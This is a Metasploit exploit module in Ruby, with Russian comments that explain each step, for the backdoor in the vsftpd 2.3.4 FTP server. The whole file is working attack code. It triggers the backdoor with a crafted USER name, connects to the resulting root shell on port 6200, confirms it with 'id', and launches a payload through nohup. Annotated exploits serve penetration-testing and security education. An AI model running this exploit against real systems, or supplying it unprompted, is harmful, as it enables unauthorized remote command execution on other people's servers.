##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp

  # функция инициализации, позволяет указать параметры модуля, автора, лицензию и другую информацию
  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'VSFTPD v2.3.4 Backdoor Command Execution',
      'Description'    => %q{
          This module exploits a malicious backdoor that was added to the	VSFTPD download
          archive. This backdoor was introduced into the vsftpd-2.3.4.tar.gz archive between
          June 30th 2011 and July 1st 2011 according to the most recent information
          available. This backdoor was removed on July 3rd 2011.
      },
      'Author'         => [ 'hdm', 'MC' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'OSVDB', '73573'],
          [ 'URL', 'http://pastebin.com/AetT9sS5'],
          [ 'URL', 'http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html' ],
        ],
      'Privileged'     => true,
      'Platform'       => [ 'unix' ],
      'Arch'           => ARCH_CMD,
      'Payload'        =>
        {
          'Space'    => 2000,
          'BadChars' => '',
          'DisableNops' => true,
          'Compat'      =>
            {
              'PayloadType'    => 'cmd_interact',
              'ConnectionType' => 'find'
            }
        },
      'Targets'        =>
        [
          [ 'Automatic', { } ],
        ],
      'DisclosureDate' => 'Jul 3 2011',
      'DefaultTarget' => 0))

    register_options([ Opt::RPORT(21) ], self.class)
  end


  # главная функция для эксплойта
  def exploit

  	# подключаемся по указанному адресу к порту 6200
    nsock = self.connect(false, {'RPORT' => 6200}) rescue nil

    # в случае, если соединились, значит бэкдор уже задействован, в нормальном случае не подключены
    if nsock
      print_status("The port used by the backdoor bind listener is already open")
      handle_backdoor(nsock)
      return
    end

    # соединяемся
    connect

    # получаем заголовок
    banner = sock.get_once(-1, 30).to_s
    print_status("Banner: #{banner.strip}")

    # отправляем случайную последовательность
    sock.put("USER #{rand_text_alphanumeric(rand(6)+1)}:)\r\n")

    # получаем ответ
    resp = sock.get_once(-1, 30).to_s
    print_status("USER: #{resp.strip}")

    # если начинается с 530, то только для анонимных пользователей
    if resp =~ /^530 /
      print_error("This server is configured for anonymous only and the backdoor code cannot be reached")
      disconnect
      return
    end

    # если не начинается с 331, то сервер ответил неожиданно
    if resp !~ /^331 /
      print_error("This server did not respond as expected: #{resp.strip}")
      disconnect
      return
    end

    # посылаем в качестве пароля случайную последовательность
    sock.put("PASS #{rand_text_alphanumeric(rand(6)+1)}\r\n")

    # далее пытаемся соединиться и задействовать бэкдор
    nsock = self.connect(false, {'RPORT' => 6200}) rescue nil
    if nsock
      print_good("Backdoor service has been spawned, handling...")
      handle_backdoor(nsock)
      return
    end

    # отсоединяемся
    disconnect

  end

  def handle_backdoor(s)

  	# отправляем id\n: если это консоль, то вернёт id пользователя
    s.put("id\n")

    r = s.get_once(-1, 5).to_s

    # проверяем, является ли сервис шеллом, в случае, если нет, отсоединяемся
    if r !~ /uid=/
      print_error("The service on port 6200 does not appear to be a shell")
      disconnect(s)
      return
    end

    # если сервис является шеллом, 
    print_good("UID: #{r.strip}")

    # отправляем пэйлоад
    s.put("nohup " + payload.encoded + " >/dev/null 2>&1")

    # вызываем обработчик консоли
    handler(s)
  end

end
